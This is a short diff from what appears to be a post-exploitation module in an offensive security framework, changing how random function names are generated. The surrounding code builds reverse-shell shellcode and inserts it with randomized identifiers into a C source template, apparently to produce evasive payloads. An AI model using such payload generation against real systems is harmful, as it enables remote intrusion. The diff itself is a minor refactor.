@@ -47,8 +47,8 @@ class PostModule(PostPythonModule):
 
     def run(self):
         shellcode = self.generate_hex_reverse_shellcode_by_handler()
-        FUNCTION1 = self.random_str(8)
-        FUNCTION2 = self.random_str(9)
+        FUNCTION1 = random_str(8)
+        FUNCTION2 = random_str(9)
 
         source_code = self.generate_context_by_template(filename="main.c", SHELLCODE_STR=shellcode, FUNCTION1=FUNCTION1,
                                                         FUNCTION2=FUNCTION2)
